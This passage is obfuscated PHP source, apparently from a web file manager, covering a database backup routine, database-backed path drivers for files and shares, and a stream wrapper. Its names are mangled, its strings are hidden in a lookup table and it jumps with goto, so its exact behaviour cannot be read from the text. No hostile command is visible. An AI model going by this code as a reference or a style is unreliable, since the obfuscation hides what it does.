$è‘œ„’->db()->getTables(); } catch (Exception $¾âöÖšè) { return !1; } $šˆñáïÎ = array_diff($šˆñáïÎ, array($›ğ©”É[831], $›ğ©”É[832])); foreach ($šˆñáïÎ as $ÛÛá”±Ê) { $½á³´Ö¸ += $è‘œ„’->model($ÛÛá”±Ê)->count(); } $±’§İª¬ = new Task($›ğ©”É[833], $›ğ©”É[834], $½á³´Ö¸, LNG($›ğ©”É[835]) . $›ğ©”É[836] . LNG($›ğ©”É[837])); $GLOBALS[$›ğ©”É[838]] = self::$name; foreach ($šˆñáïÎ as $ÛÛá”±Ê) { $©å÷™ÖÔ = $”äù¼£¬ . $ÛÛá”±Ê . $›ğ©”É[839]; $£ûõúÑÙ = null; if ($ÛÛá”±Ê == $›ğ©”É[840] && (!isset($€ˆÉ×òù[$›ğ©”É[806]]) || $€ˆÉ×òù[$›ğ©”É[806]] == $›ğ©”É[219])) { $£ûõúÑÙ = self::$io; } $ÜğòŠ£Ø += $è‘œ„’->sqlFromDb($ÛÛá”±Ê, $©å÷™ÖÔ, $±’§İª¬, $£ûõúÑÙ); } unset($GLOBALS[$›ğ©”É[838]]); $±’§İª¬->end(); if ($ÜğòŠ£Ø > $½á³´Ö¸) { $½á³´Ö¸ = $ÜğòŠ£Ø; } $¨Æ¼Ã¬à = array($›ğ©”É[828] => $÷¹®ï‹×, $›ğ©”É[825] => 1, $›ğ©”É[841] => $½á³´Ö¸, $›ğ©”É[842] => $ÜğòŠ£Ø, $›ğ©”É[843] => time()); Backup::set($¨Æ¼Ã¬à); if ($½á³´Ö¸ - $ÜğòŠ£Ø > 0) { $¦º«ºˆÎ = $›ğ©”É[844]; if (!stristr(I18n::getType(), $›ğ©”É[845])) { $¦º«ºˆÎ = $›ğ©”É[846]; } write_log(array($¦º«ºˆÎ, $¨Æ¼Ã¬à), $›ğ©”É[834]); return !1; } return !0; } private function tmpFilesPath() { $ôïÙØ² =& $_SERVER[º·Ï‹¥³]; $ŸÉˆÂƒå = TEMP_FILES; if ($GLOBALS[$ôïÙØ²[6]][$ôïÙØ²[92]][$ôïÙØ²[847]]) { $ŸÉˆÂƒå = $GLOBALS[$ôïÙØ²[6]][$ôïÙØ²[92]][$ôïÙØ²[847]]; if (!mk_dir($ŸÉˆÂƒå) || !is_writable($ŸÉˆÂƒå) || !IO::mkfile($ŸÉˆÂƒå . $ôïÙØ²[848])) { $ŸÉˆÂƒå = TEMP_FILES; } } return $ŸÉˆÂƒå; } } goto d‡ÎŞ•¤Œ³; EùÂ•Šè: class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($áĞª´ôŠ) { $this->pathParse = $áĞª´ôŠ; $this->model = Model($_SERVER[º·Ï‹¥³][1388]); } public function getPath($âğóÇ—£) { return trim($âğóÇ—£, $_SERVER[º·Ï‹¥³][8]); } public function pathFather($ŒÁ¸¦õª) { $‹å×Øšê = $this->parse($ŒÁ¸¦õª); $‹å×Øšê = $this->infoSimple($ŒÁ¸¦õª); return $‹å×Øšê ? $‹å×Øšê[$_SERVER[º·Ï‹¥³][183]] : !1; } public function pathThis($áİ²€ƒÍ) { $İ»¤ëÆ× = $this->infoSimple($áİ²€ƒÍ); return $İ»¤ëÆ× ? $İ»¤ëÆ×[$_SERVER[º·Ï‹¥³][32]] : !1; } public function getPathOuter($İ–«¼¡š) { if (!$İ–«¼¡š) { return $İ–«¼¡š; } $Ì£¨´» = $this->parse($İ–«¼¡š); return KodIO::make($Ì£¨´»[$_SERVER[º·Ï‹¥³][459]]); } public function copyFolderFromIO($„åŒÍ¼Å, $¤ÌÏ’¹, $ıúŒºğÙ, $ı”œûîÆ, $Ìõ¿“Ô) { $­ìÓ¾ñ¼ = $this->model->copyFolderFromIO($„åŒÍ¼Å, $¤ÌÏ’¹, $ıúŒºğÙ, $ı”œûîÆ, $Ìõ¿“Ô); return KodIO::make($­ìÓ¾ñ¼); } public function isParentOf($ï³÷ê”ì, $—¥«Á°) { return $this->model->isParentOf($ï³÷ê”ì, $—¥«Á°); } public function mkfile($¶îêı‰„, $×¹‰™‘® = '', $ŸøñÅ = REPEAT_RENAME) { $û¥Ã‘°Û =& $_SERVER[º·Ï‹¥³]; $ÒÈ±˜ğÖ = $this->parse($¶îêı‰„); $¶îêı‰„ = $ÒÈ±˜ğÖ[$û¥Ã‘°Û[459]]; for ($ÇãÂÏªí = 0; $ÇãÂÏªí < count($ÒÈ±˜ğÖ[$û¥Ã‘°Û[1389]]); $ÇãÂÏªí++) { $Š×¢¦Õş = $ÒÈ±˜ğÖ[$û¥Ã‘°Û[1389]][$ÇãÂÏªí]; if ($ÇãÂÏªí == count($ÒÈ±˜ğÖ[$û¥Ã‘°Û[1389]]) - 1) { $¶îêı‰„ = $this->model->mkfile($¶îêı‰„, $Š×¢¦Õş, $×¹‰™‘®, $ŸøñÅ); break; } $¶îêı‰„ = $this->model->mkdir($¶îêı‰„, $Š×¢¦Õş, REPEAT_SKIP); } return $this->getPathOuter($¶îêı‰„); } public function mkdir($Ü¶´Õæ¯, $øÕúá˜Â = REPEAT_SKIP) { $¦¹øâï =& $_SERVER[º·Ï‹¥³]; $°êõµÇ = $this->parse($Ü¶´Õæ¯); $Ü¶´Õæ¯ = $°êõµÇ[$¦¹øâï[459]]; for ($Ş¢·óüê = 0; $Ş¢·óüê < count($°êõµÇ[$¦¹øâï[1389]]); $Ş¢·óüê++) { $©ÓÉ§ëî = $°êõµÇ[$¦¹øâï[1389]][$Ş¢·óüê]; $Ü¶´Õæ¯ = $this->model->mkdir($Ü¶´Õæ¯, $©ÓÉ§ëî, $øÕúá˜Â); } return $this->getPathOuter($Ü¶´Õæ¯); } public function copyFile($¡–ššÕ, $Æ¨ÅÓÓ”, $ÊêÈ¯ğ = REPEAT_REPLACE) { $­É ¶—Û =& $_SERVER[º·Ï‹¥³]; $À†—šç = $this->parse($Æ¨ÅÓÓ”); $–¡Üâ£Â = $this->model->copy($¡–ššÕ, $À†—šç[$­É ¶—Û[459]], $ÊêÈ¯ğ, $À†—šç[$­É ¶—Û[87]]); return $–¡Üâ£Â ? $this->getPathOuter($–¡Üâ£Â) : !1; } public function moveFile($²ĞŠÑëœ, $½Â…Ø©, $ÂËËóÏ— = REPEAT_REPLACE) { $ú¢°“ƒ„ =& $_SERVER[º·Ï‹¥³]; $ıªü±ÎÜ = $this->parse($½Â…Ø©); $âî¸Œ×Œ = $this->model->move($²ĞŠÑëœ, $ıªü±ÎÜ[$ú¢°“ƒ„[459]], $ÂËËóÏ—, $ıªü±ÎÜ[$ú¢°“ƒ„[87]]); return $âî¸Œ×Œ ? $this->getPathOuter($âî¸Œ×Œ) : !1; } public function copy($Ä”ñéÒ›, $İ²ªŠ¡Š, $¾”‰»¦œ = REPEAT_REPLACE, $åŸ ú®é = false) { $ÎúĞØ‰ = $this->parse($İ²ªŠ¡Š); $Î®šßïæ = $this->model->copy($Ä”ñéÒ›, $ÎúĞØ‰[$_SERVER[º·Ï‹¥³][459]], $¾”‰»¦œ, $åŸ ú®é); return $Î®šßïæ ? $this->getPathOuter($Î®šßïæ) : !1; } public function moveSameAllow() { } public function move($ˆ“ò÷å´, $ïÒØ‹ºÇ, $´©ÑÉ¤… = REPEAT_REPLACE, $Ÿ¹¬ıá = false) { $ùÕîŒ™¬ = $this->parse($ïÒØ‹ºÇ); $Ù¨Í“ª = $this->model->move($ˆ“ò÷å´, $ùÕîŒ™¬[$_SERVER[º·Ï‹¥³][459]], $´©ÑÉ¤…, $Ÿ¹¬ıá); return $Ù¨Í“ª ? $this->getPathOuter($Ù¨Í“ª) : !1; } public function remove($ÑàË´Ş•, $´§éšçğ = true) { return $this->model->remove($ÑàË´Ş•, $´§éšçğ); } public function rename($ßÕİÃ, $÷·Ö´Áş) { $ûËÏ¼ñ£ = $this->model->rename($ßÕİÃ, $÷·Ö´Áş); return $ûËÏ¼ñ£ ? $this->getPathOuter($ßÕİÃ) : $ûËÏ¼ñ£; } public function size($¤Ï€ÂÌ¶) { $Ÿª–ÒÏï = $this->infoSimple($¤Ï€ÂÌ¶); return $Ÿª–ÒÏï ? $Ÿª–ÒÏï[$_SERVER[º·Ï‹¥³][79]] : 0; } public function infoSimple($õ¿îãÚË) { return $this->model->sourceInfo($õ¿îãÚË); } public function info($³Êéº»¦) { return $this->infoParse($³Êéº»¦); } public function infoAuth($Á•æô°) { return $this->infoParse($Á•æô°, !1, !0); } public function infoWithChildren($éÀĞßº‘) { return $this->infoParse($éÀĞßº‘, !0); } protected function infoParse($Äö¸™ß€, $Ùî—çàë = false, $ÌĞÔÛùĞ = false) { if (!$Ùî—çàë) { return $this->model->pathInfo($Äö¸™ß€, $ÌĞÔÛùĞ); } return $this->model->pathInfoMore($Äö¸™ß€); } public function infoFullSimple($›¥İ‹Àğ) { $èæÖñ•ˆ =& $_SERVER[º·Ï‹¥³]; $²®åÓĞ = explode($èæÖñ•ˆ[8], $›¥İ‹Àğ); $ç¶Ò³ƒš = implode($èæÖñ•ˆ[8], array_splice($²®åÓĞ, 1)); return $this->model->pathInfoByPath($²®åÓĞ[0], $ç¶Ò³ƒš); } public function infoFull($âƒëÌ†ª) { $Ö›ÇâÒ™ = $this->infoFullSimple($âƒëÌ†ª); return is_array($Ö›ÇâÒ™) ? $this->model->pathInfo($Ö›ÇâÒ™[$_SERVER[º·Ï‹¥³][184]]) : !1; } public function hashSimple($†¸ø˜øÄ) { $èÜ“îğß =& $_SERVER[º·Ï‹¥³]; $¤ı‡æş§ = $this->infoWithChildren($†¸ø˜øÄ); return $¤ı‡æş§[$èÜ“îğß[533]][$èÜ“îğß[656]]; } public function hashMd5($ÛÃóêá) { $Ù¨©Š…Ñ =& $_SERVER[º·Ï‹¥³]; $…ÛœÎÍ = $this->infoWithChildren($ÛÃóêá); return $…ÛœÎÍ[$Ù¨©Š…Ñ[533]][$Ù¨©Š…Ñ[531]]; } public function exist($€öÔ‹º”) { $¸ÒúÁå» =& $_SERVER[º·Ï‹¥³]; $•œØïÛ£ = $this->parse($€öÔ‹º”); if (!$•œØïÛ£[$¸ÒúÁå»[87]]) { return $this->isFile($€öÔ‹º”) || $this->isFolder($€öÔ‹º”); } $–ÒÓ–Ó = array($¸ÒúÁå»[461] => $•œØïÛ£[$¸ÒúÁå»[459]], $¸ÒúÁå»[32] => $•œØïÛ£[$¸ÒúÁå»[87]]); $¯—ùÏ‡Ü = $this->model->where($–ÒÓ–Ó)->find(); return $¯—ùÏ‡Ü ? !0 : !1; } public function isFile($‡ÜªøïŞ) { $Š íâğ =& $_SERVER[º·Ï‹¥³]; $˜è¥†—Ğ = $this->infoSimple($‡ÜªøïŞ); return $˜è¥†—Ğ && $˜è¥†—Ğ[$Š íâğ[469]] == $Š íâğ[219] ? !0 : !1; } public function isFolder($ÒÁÈŸûÚ) { $Æ¸ˆ‘¿ì =& $_SERVER[º·Ï‹¥³]; $‹Àô€ê„ = $this->infoSimple($ÒÁÈŸûÚ); return $‹Àô€ê„ && $‹Àô€ê„[$Æ¸ˆ‘¿ì[469]] == $Æ¸ˆ‘¿ì[91] ? !0 : !1; } public function listPath($¥íšÒŞÉ, $Ñ™½’ = false) { $Õ¹ä¨£ß =& $_SERVER[º·Ï‹¥³]; if ($¥íšÒŞÉ == $Õ¹ä¨£ß[12]) { return !1; } $ŞüºÎİè = array($Õ¹ä¨£ß[461] => $¥íšÒŞÉ); if ($Ñ™½’) { return $this->model->listSource($ŞüºÎİè, -1); } return $this->model->listSource($ŞüºÎİè); } public function has($™…½°æ¢, $şŸ€¤Ï³ = false, $šóÌÉ™ = null) { $Ÿ„³‡á =& $_SERVER[º·Ï‹¥³]; $ª‘ÑÃœ = $this->infoWithChildren($™…½°æ¢); if ($şŸ€¤Ï³) { return array($Ÿ„³‡á[231] => $ª‘ÑÃœ[$Ÿ„³‡á[231]], $Ÿ„³‡á[230] => $ª‘ÑÃœ[$Ÿ„³‡á[230]]); } return $šóÌÉ™ ? $ª‘ÑÃœ[$Ÿ„³‡á[231]] : $ª‘ÑÃœ[$Ÿ„³‡á[230]]; } public function listAll($ÑšÈÁÖ‘) { $Æ¡ìß®§ = IO::info($this->pathParse[$_SERVER[º·Ï‹¥³][87]]); if (!$Æ¡ìß®§) { return array(); } return $this->model->listAll($ÑšÈÁÖ‘); } public function getContent($Ãíª•Ä) { return $this->model->getContent($Ãíª•Ä); } public function setContent($Î£í¥Õ, $ğË¦ªß£ = '') { return $this->model->setContent($Î£í¥Õ, $ğË¦ªß£); } public function fileSubstr($í›ú¯Ğ, $Üæ¹Ê©£, $ä‹¡£ªÖ) { return $this->model->fileSubstr($í›ú¯Ğ, $Üæ¹Ê©£, $ä‹¡£ªÖ); } public function download($ÕÉ¯•Ä, $¤¶æÀ® = '') { $Û·»üÍú = get_path_father($¤¶æÀ®); $–¥¿®òƒ = get_path_this($¤¶æÀ®); $İµ•›”€ = $this->model->fileInfoGet($ÕÉ¯•Ä); $Áç¾ÁâÁ = IO::copy($İµ•›”€[$_SERVER[º·Ï‹¥³][87]], $Û·»üÍú, !1, $–¥¿®òƒ); return $Áç¾ÁâÁ; } public function setModifyTime($ªØİ‹îÕ, $Í¾İ’¿£ = '') { $íÓîÂİ¦ =& $_SERVER[º·Ï‹¥³]; if (!$ªØİ‹îÕ) { return; } $this->model->where(array($íÓîÂİ¦[475] => $ªØİ‹îÕ))->save(array($íÓîÂİ¦[88] => $Í¾İ’¿£)); } public function upload($Š»¡ø–¿, $‘ô…àÈ°, $ß•Èƒä² = false, $ÅşíÏñ = REPEAT_REPLACE) { $ŒŒâÈ›— =& $_SERVER[º·Ï‹¥³]; $‚¶‚Èø = $this->parse($Š»¡ø–¿); $·¦—åŠ = $this->model->addFile($‚¶‚Èø[$ŒŒâÈ›—[459]], $‘ô…àÈ°, $‚¶‚Èø[$ŒŒâÈ›—[87]], $ß•Èƒä², $ÅşíÏñ); return $this->getPathOuter($·¦—åŠ); } public function uploadFileByID($öô²İØ•, $œ©†şö¨, $ˆí“œ§) { $×‡¥¡”â =& $_SERVER[º·Ï‹¥³]; $Ÿ–£ÀÔı = $this->parse($öô²İØ•); $­ÑÒ…† = $this->model->addFileByFileID($Ÿ–£ÀÔı[$×‡¥¡”â[459]], $œ©†şö¨, $Ÿ–£ÀÔı[$×‡¥¡”â[87]], $ˆí“œ§); return $this->getPathOuter($­ÑÒ…†); } public function addFileByRemote($ŸÇã‚•„, $¤«®³Ä”, $Ô‡éŠ©Œ = array(), $ÑÅûÆ´˜ = '', $äà‚ß†±) { $»Õª¹ª =& $_SERVER[º·Ï‹¥³]; $˜à˜ê• = $this->parse($ŸÇã‚•„); $ÑÅûÆ´˜ = empty($ÑÅûÆ´˜) ? $˜à˜ê•[$»Õª¹ª[87]] : $ÑÅûÆ´˜; $ö‹„õ—Ã = $this->model->addFileByRemote($˜à˜ê•[$»Õª¹ª[459]], $¤«®³Ä”, $ÑÅûÆ´˜, $Ô‡éŠ©Œ, $äà‚ß†±); return $this->getPathOuter($ö‹„õ—Ã); } public function uploadLink($ÉÂüØ, $•á”ëô = 0) { $Ùã‘¤Ï¡ =& $_SERVER[º·Ï‹¥³]; $ÌŒ«¿ã = $this->parse($ÉÂüØ); $É°¥æŒ… = _get($GLOBALS[$Ùã‘¤Ï¡[7]], $Ùã‘¤Ï¡[1390]); $•ùìÎ¦ = _get($GLOBALS[$Ùã‘¤Ï¡[7]], $Ùã‘¤Ï¡[1391]); $ÉÂüØ = Model($Ùã‘¤Ï¡[658])->createFileName($ÌŒ«¿ã[$Ùã‘¤Ï¡[87]], $É°¥æŒ…, $•ùìÎ¦); return IO::uploadLink($ÉÂüØ, $•á”ëô); } public function fileNameAuto($®ä•øá, $–ÍûÉ½, $ºµË¦´º = REPEAT_REPLACE, $†Ñîñ™± = false) { return $this->model->fileNameAuto($®ä•øá, $–ÍûÉ½, $ºµË¦´º, $†Ñîñ™±); } public function fileNameExist($ñÚê½Ê‰, $¨•ÉÁ¨) { return $this->model->fileNameExist($ñÚê½Ê‰, $¨•ÉÁ¨); } protected function _fileOut($±Ÿå¶¿ê, $¹Ÿ ¤·Ğ = false, $òƒ¸Û®è = false, $†˜Ëˆâ€ = '', $âóšïÚ = false) { $­¤‚¿†¬ =& $_SERVER[º·Ï‹¥³]; $—ÌŒ‰´ = $this->model->sourceInfo($±Ÿå¶¿ê); if ($—ÌŒ‰´[$­¤‚¿†¬[469]] == $­¤‚¿†¬[91]) { header($­¤‚¿†¬[1392]); die; } $×Æ¹Ø¡ = $this->model->fileInfoGet($±Ÿå¶¿ê); $†˜Ëˆâ€ = $×Æ¹Ø¡[$­¤‚¿†¬[531]] ? $×Æ¹Ø¡[$­¤‚¿†¬[531]] : $†˜Ëˆâ€; $ÊŠ¡Î¬€ = is_array($GLOBALS[$­¤‚¿†¬[172]]) ? $GLOBALS[$­¤‚¿†¬[172]][$­¤‚¿†¬[32]] : $—ÌŒ‰´[$­¤‚¿†¬[32]]; if ($âóšïÚ) { return IO::fileOutServer($×Æ¹Ø¡[$­¤‚¿†¬[87]], $¹Ÿ ¤·Ğ, $ÊŠ¡Î¬€, $†˜Ëˆâ€); } IO::fileOut($×Æ¹Ø¡[$­¤‚¿†¬[87]], $¹Ÿ ¤·Ğ, $ÊŠ¡Î¬€, $†˜Ëˆâ€); } public function fileOut($ŸŒ»¥¶¹, $¤œ¢ÛõÍ = false, $¼‘ñ˜äµ = false, $ŠƒšãÃù = '') { $this->_fileOut($ŸŒ»¥¶¹, $¤œ¢ÛõÍ, $¼‘ñ˜äµ, $ŠƒšãÃù); } public function fileOutServer($–¯Ä±Á‚, $ç Îşí‡ = false, $ïúŸø›„ = false, $«Ù€Æ¦ = '') { $this->_fileOut($–¯Ä±Á‚, $ç Îşí‡, $ïúŸø›„, $«Ù€Æ¦, !0); } protected function _fileOutImage($ÖõÌ‚œÒ, $²ù¤ÀÂ® = 250) { $àïÒ°Ñå =& $_SERVER[º·Ï‹¥³]; $ıÖğß† = $this->model->pathInfo($ÖõÌ‚œÒ); if ($ıÖğß†[$àïÒ°Ñå[469]] == $àïÒ°Ñå[91]) { show_json($àïÒ°Ñå[1393] . $ÖõÌ‚œÒ, !1); } $¬·æœâ¶ = $this->model->fileInfoGet($ÖõÌ‚œÒ); $ıÖğß†[$àïÒ°Ñå[173]] = $¬·æœâ¶[$àïÒ°Ñå[87]]; $GLOBALS[$àïÒ°Ñå[172]] = $ıÖğß†; IO::fileOutImage($¬·æœâ¶[$àïÒ°Ñå[87]], $²ù¤ÀÂ®); } public function fileOutImage($ò‡ƒ«‰, $å€Éº¦ş = 250) { $this->_fileOutImage($ò‡ƒ«‰, $å€Éº¦ş); } public function fileOutImageServer($Å£ÆìÆ, $ÒĞéÅ•Ç = 250) { $this->_fileOutImage($Å£ÆìÆ, $ÒĞéÅ•Ç); } public function link($ò¡‡§Ò°, $ÓÌ­‡Ë¨ = '') { $Ò¦•ıĞÊ = $this->model->fileInfoGet($ò¡‡§Ò°); return IO::link($Ò¦•ıĞÊ[$_SERVER[º·Ï‹¥³][87]], $ÓÌ­‡Ë¨); } protected function parse($Òêıá‡) { $¥ÉÅº—‚ =& $_SERVER[º·Ï‹¥³]; if (strstr($Òêıá‡, $¥ÉÅº—‚[8]) === !1) { return array($¥ÉÅº—‚[477] => intval($Òêıá‡), $¥ÉÅº—‚[87] => $¥ÉÅº—‚[12], $¥ÉÅº—‚[1389] => array()); } $ñù’ÃŠœ = explode($¥ÉÅº—‚[8], trim($Òêıá‡, $¥ÉÅº—‚[8])); if (count($ñù’ÃŠœ) < 2) { show_tips(clear_html($Òêıá‡) . $¥ÉÅº—‚[1394]); } return array($¥ÉÅº—‚[477] => intval($ñù’ÃŠœ[0]), $¥ÉÅº—‚[87] => $ñù’ÃŠœ[1], $¥ÉÅº—‚[1389] => array_slice($ñù’ÃŠœ, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($ÜéØº’®) { $this->pathParse = $ÜéØº’®; $this->model = Model($_SERVER[º·Ï‹¥³][1388]); } public function getPathOuter($ù¯ã¬ƒ¨) { $Æµöù£ã =& $_SERVER[º·Ï‹¥³]; if (!$ù¯ã¬ƒ¨) { return $ù¯ã¬ƒ¨; } $Âóº“ø = $this->parse($ù¯ã¬ƒ¨); return trim(KodIO::makeShare($this->pathParse[$Æµöù£ã[459]], $Âóº“ø[$Æµöù£ã[459]]), $Æµöù£ã[8]); } protected function infoParse($Ÿ»õœ­·, $ï¢…—â· = false, $Ç„ÓŞÁº = false) { $°ê‘± =& $_SERVER[º·Ï‹¥³]; $Ë½é¡¾ = $this->pathParse[$°ê‘±[459]]; $í²ú¿ü„ = trim($this->pathParse[$°ê‘±[1221]], $°ê‘±[8]); return Action($°ê‘±[1395])->sharePathInfo($Ë½é¡¾, $í²ú¿ü„, $ï¢…—â·); } public function infoFull($®úŞäİ«) { $öúçÕÀÄ =& $_SERVER[º·Ï‹¥³]; $ßÊ–«ô• = explode($öúçÕÀÄ[8], trim($®úŞäİ«, $öúçÕÀÄ[8])); if (count($ßÊ–«ô•) > 1) { $æØºşÆ = implode($öúçÕÀÄ[8], array_splice($ßÊ–«ô•, 1)); $ç¶¦‘° = $this->model->pathInfoByPath($ßÊ–«ô•[0], $æØºşÆ); if (!$ç¶¦‘°) { return !1; } $this->pathParse[$öúçÕÀÄ[1221]] = $ç¶¦‘°[$öúçÕÀÄ[184]]; } return $this->infoParse($®úŞäİ«); } public function listAll($ñŞ’–î§) { $ƒ„Ñëİ§ =& $_SERVER[º·Ï‹¥³]; $ÌÇ˜·©§ = IO::info($this->pathParse[$ƒ„Ñëİ§[87]]); if (!$ÌÇ˜·©§) { return array(); } $Şª¨åó¿ = $this->model->listAll($ñŞ’–î§); $…ñáıİ¨ = Model($ƒ„Ñëİ§[648])->getInfo($ÌÇ˜·©§[$ƒ„Ñëİ§[649]]); foreach ($Şª¨åó¿ as &$Á›ÆÌŒÂ) { check_abort(); $Á›ÆÌŒÂ[$ƒ„Ñëİ§[90]] = Action($ƒ„Ñëİ§[1395])->_shareItemeParse($Á›ÆÌŒÂ[$ƒ„Ñëİ§[90]], $…ñáıİ¨); } unset($Á›ÆÌŒÂ); return $Şª¨åó¿; } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($³Ê«ºğõ) { $this->pathParse = $³Ê«ºğõ; $this->model = Model($_SERVER[º·Ï‹¥³][1388]); } protected function infoParse($§ºÅ°®Û, $ØŒ±Ø = false, $Îàüüá… = false) { $„Ò×Ñ…£ =& $_SERVER[º·Ï‹¥³]; return Action($„Ò×Ñ…£[1227])->sharePathInfo($this->pathParse[$„Ò×Ñ…£[87]], !0, $ØŒ±Ø); } public function listPath($©‚£ûÌé, $Í­ì£‘„ = false) { $“êâ©Ô¾ =& $_SERVER[º·Ï‹¥³]; $¯˜‘Ø¤† = parent::listPath($©‚£ûÌé, $Í­ì£‘„); if (!$¯˜‘Ø¤†) { return $¯˜‘Ø¤†; } if (is_array($¯˜‘Ø¤†[$“êâ©Ô¾[1396]])) { $¯˜‘Ø¤†[$“êâ©Ô¾[1396]] = Action($“êâ©Ô¾[1227])->shareItemInfo($¯˜‘Ø¤†[$“êâ©Ô¾[1396]]); } foreach ($¯˜‘Ø¤† as $×½å›¾ƒ => $¿¦Ğû„½) { if (!in_array($×½å›¾ƒ, array($“êâ©Ô¾[86], $“êâ©Ô¾[85]))) { continue; } foreach ($¿¦Ğû„½ as $¨¾ÉÊåß => $Ğ‰ğ•Í–) { $¯˜‘Ø¤†[$×½å›¾ƒ][$¨¾ÉÊåß] = Action($“êâ©Ô¾[1227])->shareItemInfo($Ğ‰ğ•Í–); } } return $¯˜‘Ø¤†; } public function listAll($ìõ³×›Å) { $óÕ÷·¹ =& $_SERVER[º·Ï‹¥³]; $ÙÔ¡óÔ = IO::info($this->pathParse[$óÕ÷·¹[87]]); if (!$ÙÔ¡óÔ) { return array(); } $‘Èè¦ïÌ = $this->model->listAll($ìõ³×›Å); foreach ($‘Èè¦ïÌ as &$ÀßÌ°Èô) { $ÀßÌ°Èô[$óÕ÷·¹[90]] = Action($óÕ÷·¹[1227])->shareItemInfo($ÀßÌ°Èô[$óÕ÷·¹[90]]); } unset($ÀßÌ°Èô); return $‘Èè¦ïÌ; } } goto EèÙÑºİóî; Cˆ×Ûê†›²: class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($€æÛÃŞ, $Íí©øı = '') { $this->info = $this->info($€æÛÃŞ); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[º·Ï‹¥³][87]]; $this->pathOpen = $€æÛÃŞ; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$€æÛÃŞ])) { self::$_chunkBuffer[$€æÛÃŞ] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function stream_read($íòë¬ú) { $¾ü¶Œ½Ÿ = $this->fileSubstr($this->pose, $íòë¬ú); $this->pose += strlen($¾ü¶Œ½Ÿ); return $¾ü¶Œ½Ÿ; } public function stream_tell() { return $this->pose; } public function stream_seek($´´¶øª, $¯¤´êç) { $‹áÂËĞè =& $_SERVER[º·Ï‹¥³]; if ($¯¤´êç == SEEK_SET) { $this->pose = $´´¶øª; } else { if ($¯¤´êç == SEEK_CUR) { $this->pose += $´´¶øª; } else { if ($¯¤´êç == SEEK_END) { $this->pose = $this->info[$‹áÂËĞè[79]] + intval($´´¶øª); } } } if ($´´¶øª < 0) { $this->pose = $this->info[$‹áÂËĞè[79]] + $´´¶øª; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[º·Ï‹¥³][79]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($¶­ò“™â, $ÇÄÃù¨İ) { $—‰ÂĞâÕ =& $_SERVER[º·Ï‹¥³]; $ßÚ©àû = $this->info($¶­ò“™â); return array($—‰ÂĞâÕ[1592] => 0, $—‰ÂĞâÕ[1593] => 0, $—‰ÂĞâÕ[16] => 32768 + 511, $—‰ÂĞâÕ[1594] => 0, $—‰ÂĞâÕ[1595] => 0, $—‰ÂĞâÕ[1596] => 0, $—‰ÂĞâÕ[1597] => 0, $—‰ÂĞâÕ[79] => $ßÚ©àû[$—‰ÂĞâÕ[79]], $—‰ÂĞâÕ[1598] => $ßÚ©àû[$—‰ÂĞâÕ[1423]], $—‰ÂĞâÕ[1554] => $ßÚ©àû[$—‰ÂĞâÕ[88]], $—‰ÂĞâÕ[1553] => $ßÚ©àû[$—‰ÂĞâÕ[222]], $—‰ÂĞâÕ[1599] => 0, $—‰ÂĞâÕ[1600] => 0); } static $fileInfo = array(); public function info($şçÜŒ¿ı) { $›œ€Æ—ê = $_SERVER[º·Ï‹¥³][1601]; if (isset(self::$fileInfo[$şçÜŒ¿ı])) { return self::$fileInfo[$şçÜŒ¿ı]; } if (substr($şçÜŒ¿ı, 0, strlen($›œ€Æ—ê)) != $›œ€Æ—ê) { return !1; } self::$fileInfo[$şçÜŒ¿ı] = IO::info(substr($şçÜŒ¿ı, strlen($›œ€Æ—ê))); return self::$fileInfo[$şçÜŒ¿ı]; } public static function read($º›Œ¶Èç, $â÷È•Ô , $Ê©¦°ß´) { if (!isset(self::$_fopenCache[$º›Œ¶Èç])) { $œ÷ı‘Ù = new StreamWrapperIO(); $œ÷ı‘Ù->stream_open($º›Œ¶Èç); self::$_fopenCache[$º›Œ¶Èç] = $œ÷ı‘Ù; } $œ÷ı‘Ù = self::$_fopenCache[$º›Œ¶Èç]; return $œ÷ı‘Ù->fileSubstr($â÷È•Ô , $Ê©¦°ß´); } public static function _read($ÔËöòÍ, $Şó¢ªŸ, $’ì£Õ¼¸) { $·ƒä÷ÆÀ =& $_SERVER[º·Ï‹¥³]; $ñşˆ¨Ì = fopen($ÔËöòÍ, $·ƒä÷ÆÀ[1427]); if (!$ñşˆ¨Ì) { return $·ƒä÷ÆÀ[12]; } $Æª¬ÜÛ = 8192; fseek($ñşˆ¨Ì, $Şó¢ªŸ, SEEK_SET); $êØ¥ºô• = $·ƒä÷ÆÀ[12]; $”ù—ëè = 0; while ($”ù—ëè < $’ì£Õ¼¸) { $«€«îî = min($Æª¬ÜÛ, $’ì£Õ¼¸ - $”ù—ëè); $êØ¥ºô• .= fread($ñşˆ¨Ì, $«€«îî); $”ù—ëè += $«€«îî; } fclose($ñşˆ¨Ì); return $êØ¥ºô•; } public function fileSubstr($–ûı‰, $¢ı¾Ù‚ş) { $°ŒÈàİø =& $_SERVER[º·Ï‹¥³]; $Ø®€üÃ» = $this->info[$°ŒÈàİø[79]]; $ÓéùÉ·Ô = $–ûı‰; $şé‘‰ñ = $¢ı¾Ù‚ş; if ($–ûı‰ < 0) { $–ûı‰ = $Ø®€üÃ» + $–ûı‰; } if ($¢ı¾Ù‚ş === !1) { $¢ı¾Ù‚ş = $Ø®€üÃ» - $–ûı‰; } if ($–ûı‰ + $¢ı¾Ù‚ş > $Ø®€üÃ») { $¢ı¾Ù‚ş = $Ø®€üÃ» - $–ûı‰; } if ($¢ı¾Ù‚ş <= 0) { return $°ŒÈàİø[12]; } if ($–ûı‰ < 0 || $–ûı‰ >= $Ø®€üÃ» || $¢ı¾Ù‚ş <= 0 || $¢ı¾Ù‚ş > 1024 * 1024 * 10) { throw new Exception("\x69\157\x46\x69\154\145\x52\145\141\144\40\x65\x72\162\157\x72\41\x20\x73\x74\141\162\164\75{$–ûı‰}\x3b\154\145\156\x67\x74\150\75{$¢ı¾Ù‚ş}\x3b\x20\163\x69\172\x65\75{$Ø®€üÃ»}\73"); } 